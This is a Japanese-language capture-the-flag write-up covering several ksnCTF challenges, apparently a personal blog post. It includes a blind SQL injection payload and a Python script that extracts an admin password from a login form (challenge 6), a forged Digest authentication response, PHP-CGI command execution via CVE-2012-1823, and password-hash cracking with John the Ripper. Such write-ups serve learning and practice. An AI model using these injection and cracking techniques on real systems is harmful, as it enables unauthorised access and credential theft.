+++
title = "Ksnctf writeup"
date = 2026-02-07T17:29:43+09:00
description = "解き次第書く"
draft = false
+++

解き次第書く
# 2 Easy Cipher
ただのROT13

# 3 Crawling Chaos
与えられるURLにあるhtmlのスクリプトがうーにゃーしている。
スクリプトを切り出してnodeで実行するとエラーが出るものの、デコードしてくれる。
```javascript
PS C:\ksnCTF\CrawlingChaos> node .\unya.js
undefined:3
$(function(){$("form").submit(function(){var t=$('input[type="text"]').val();var p=Array(70,152,195,284,475,612,791,896,810,850,737,1332,1469,1120,1470,832,1785,2196,1520,1480,1449);var f=false;if(p.length==t.length){f=true;for(var i=0;i<p.length;i++)if(t.charCodeAt(i)*(i+1)!=p[i])f=false;if(f)alert("(」・ω・)」うー!(/・ω・)/にゃー!");}if(!f)alert("No");return false;});});
^

ReferenceError: $ is not defined
<OMIT....>
```

`array`を取り出していい感じに計算してやるとフラグ
```python
array = [70, 152, 195, 284, 475, 612, 791, 896, 810, 850, 737, 1332, 1469, 1120, 1470, 832, 1785, 2196, 1520, 1480, 1449]

for i in range(len(array)):
    print(chr(int(array[i] / (i+1))), end='')

```
# 5 Onion
BASE64と思われる文字列が与えられる。
数回デコードを繰り返すと以下の文字列になる。
```
begin 666 <data>
51DQ!1U]&94QG4#-3:4%797I74$AU
 
end
```
一行目をググるとuuencodeでエンコードされている文字列らしい

[decoder](https://www.motohasi.net/Misc/UUConv.php)

# 6 Login
与えられるURLにアクセスするとログインフォームがある。
いつものSQLインジェクションをするとページのソースコードが表示された。

![](/images/ksnctf6-1.png)

![](/images/ksnctf6-2.png)

```PHP
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```


現時点でわかっていることは以下の通り。
- Adminのパスワードがフラグであり、ksnCTFのフラグ形式は`FLAG_<アルファベットと数字>`である。
- ログインに成功するとソースコードが表示される。

これよりBlindSQLInjectionが可能であると仮定し、検証を行った。
パスワードの1文字目はフラグ形式より、`F`である。そのため、DBのパスワードの1文字目が`F`であればTRUEになるようなクエリをソースコードを参考に考える。

`subster`関数とサブクエリを用いて、パスワードから1文字目を取り出して`F`と比較すればTRUEになる。よって以下のクエリが出来上がる。
```SQL
SELECT * FROM user WHERE id='$id' AND pass='' OR 'F'=substr((select pass from user where id='admin'),1,1); --
```
上記のクエリから不要な部分を取り除いて投げると、ソースコードが表示されSQLInjectionに成功した。

この結果より、パスワードに適切な一文字を追加->サイトに投げる->結果によって次の桁に進むor進まずに次に試す文字を変える。
を自動で試すスクリプトを書いた。

```python
import requests
import string

url = 'https://ctfq.u1tramarine.blue/q6/'
allString = string.ascii_letters + string.digits
flagLen = 5
flagStr = ''
for i in range(1, 21):
    for j in range(len(allString)):
        tmp = flagStr
        tmp += allString[j]
        SQL = "' OR 'FLAG_" + tmp +"'=substr((select pass from user where id='admin'),1," + str(flagLen + i) +"); --"

        data = {'id': 'admin', 'pass': SQL}
        response = requests.post(url=url, data=data)
        if 'Congratulation' in response.text:
            #print(response.text)
            print('FLAG_' + tmp)
            flagStr = tmp

```

フラグでた
```
PS C:\ksnCTF\Login> python .\blindSQLinjection.py
FLAG_K
FLAG_Kp
FLAG_KpW
FLAG_KpWa
FLAG_KpWa4
FLAG_KpWa4j
<OMIT...>
```

# 7 Programming
C++のソースが与えられるが何か変。
```c++
#include   	 	<stdio.h>    
	
     	#include  	  <string.h>	
	
  int   	  	main		 
	()
   {   	const		char 	* 
s	=
 "     	    " 
"0123456789"	
"     "
	
"		   "
"			         							  				 			 "    	  
	 "ABCDEFGHIJ" 	;
<OMIT...>
```

とりあえずコンパイルして実行。
```
PS C:\ksnCTF\Programming> .\a.exe
FROG_This_is_wrong_:(
```
うるさい。

「プログラミング + 空白」というと難解言語の[WhiteSpace](https://ja.wikipedia.org/wiki/Whitespace)が思い浮かぶ。

ググると[IDE](https://vii5ard.github.io/whitespace/)がみつかる。

貼り付けて実行するとPINを求められる。

![](/images/ksnctf7-1.png)

よくわからんので右側のDebugにあるPINっぽいのを入れてみる。

![](/images/ksnctf7-2.png)

でた。

# 8 Basic is secure?
与えられたpcapを見ると、とあるサイトに対してBasic認証でログインしている。
Basic認証はIDとパスワードをBASE64エンコードして送っているだけなので該当のパケットからBASE64文字列を取り出してデコードする。

# 9 Digest is secure!
与えられたpcapを見るとサイトに対してDigest認証でログインしている。また、ログイン後にhtdigestにアクセスしている。

Digest認証においてクライアントが計算するResponseは以下のように求める。[引用](https://ja.wikipedia.org/wiki/Digest%E8%AA%8D%E8%A8%BC)
```
A1 = ユーザ名 ":" realm ":" パスワード
A2 = HTTPのメソッド ":" コンテンツのURI
response = MD5( MD5(A1) ":" nonce ":" nc ":" cnonce ":" qop ":" MD5(A2) )
```

上記のうち、MD5(A1)については、htdigestの3要素目にある。

```
GET /q9/htdigest HTTP/1.1
Host: ctfq.u1tramarine.blue
Connection: keep-alive
Authorization: Digest username="q9", realm="secret", nonce="HHj57RG8BQA=4714c627c5195786fc112b67eca599d675d5454b", uri="/q9/htdigest", algorithm=MD5, response="e9654c012dc42f9f78f81a685073df98", qop=auth, nc=00000003, cnonce="1064eaa9478a0396"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ja


HTTP/1.1 200 OK
Server: nginx
Date: Wed, 24 Feb 2021 09:48:08 GMT
Content-Length: 42
Connection: keep-alive
Authentication-Info: rspauth="6b566f396d663a64270caed9ec55e44d", cnonce="1064eaa9478a0396", nc=00000003, qop=auth
Last-Modified: Wed, 24 Feb 2021 09:43:22 GMT
ETag: "2a-5bc11dd9be280"
Accept-Ranges: bytes

q9:secret:c627e19450db746b739f41b64097d449
```

Responseの計算に必要な要素を整理する。
- A1：パスワードが不明
- A2：求められる
- response
    - MD5(A1)：わかる
    - nonce：アクセス時にサーバーから送られる
    - nc：response送信時にクライアントが一緒に送る
    - cnonce：上と同じ
    - qop：nonceと同じ
    - MD5(A2)：求められる


よってBurpを使ってパスワード送信時にInterceptしてresponseを書き換えてやる。

計算スクリプトは以下。変わる値は消している。
```python
import hashlib

md5_A1 = 'c627e19450db746b739f41b64097d449'

A2 = 'GET:/q9/flag.html'
md5_A2 = hashlib.md5(A2.encode()).hexdigest()
print(md5_A2)

nonce = ''
nc = '00000002'
cnonce = ''
qop = 'auth'

response=md5_A1 + ':' + nonce + ':' + nc + ':' + cnonce + ':' + qop + ':' + md5_A2
print(response)
md5_response = hashlib.md5(response.encode()).hexdigest()
print(md5_response)
```

# 10 #!
SHEBANG

# 12 Hypertext Preprocessor

URLにアクセスすると以下の文字列が表示されている。
2012:1823:20:26:02:07:09:27:57:12:40:02:25

なお、「20:26:」以降はUTCっぽい

UTCではない最初の「2012:1823」でググるとCVEで、[解説](https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html)があった。

脆弱性の判別としてURLに`-s`をつけてアクセスするとソースコードが表示されたため、cve-2012-1823に対して脆弱である。

![](/images/ksnctf12-1.png)

徳丸先生の[Poc](https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html)を参考にpassthru()でコマンドを投げつけると実行された。あとはcatするだけで良い。

![](/images/ksnctf12-2.png)

# 14 John
以下ようなのユーザ名とハッシュ値の組が与えられる。また、問題名のJohnよりこの問題はJohn The Ripperを使用してハッシュをクラックする問題だと予想した。

```
user00:$6$Z4xEy/1KTCW.rz$Yxkc8XkscDusGWK<略>
user01:$6$ffl1bXDBqKUiD$PoXP69PaxTTX.cgz<略>
...
```

また、user99にて辞書ファイルのURLが与えられている。

```
user99:$6$SHA512IsStrong$DictionaryIsHere.http//ksnctf.sweetduet.info/q/14/dicti0nary_8Th64ikELWEsZFrf.txt:15491:0:99999:7:::
```

クラックする。

```
┌──(kali㉿kali)-[~/CTF/ksnctf/John]
└─$ john j.txt --wordlist=dicti0nary_8Th64ikELWEsZFrf.txt 
Warning: only loading hashes of type "sha512crypt", but also saw type "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 21 password hashes with 21 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ultimate         (user08)     
ADDITIONAL       (user02)     
QUESTION         (user16)     
opinion          (user15)     
karaoke          (user17)     
zero             (user19)     
HELD             (user10)     
floating         (user13)     
DELIGHT          (user20)     
JENNY            (user09)     
GENDER           (user03)     
FREQUENT         (user00)     
__________       (user04)     
SUFFERS          (user11)     
SPIRITS          (user06)     
strange          (user18)     
applies          (user05)     
zecht            (user14)     
independent      (user07)     
LATTER           (user01)     
LEAVE            (user12)     
21g 0:00:00:02 DONE (2026-10-25 05:00) 7.894g/s 1143p/s 14957c/s 14957C/s nineteen..ADMIRATION
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


user00から、user03までの単語を順番に並べてみると、

FREQUENT

LATTER

ADDITIONAL

GENDER

となり、イニシャルがFLAGになった。同様にuser00からuser20までの単語を順番に並べてフラグ獲得。

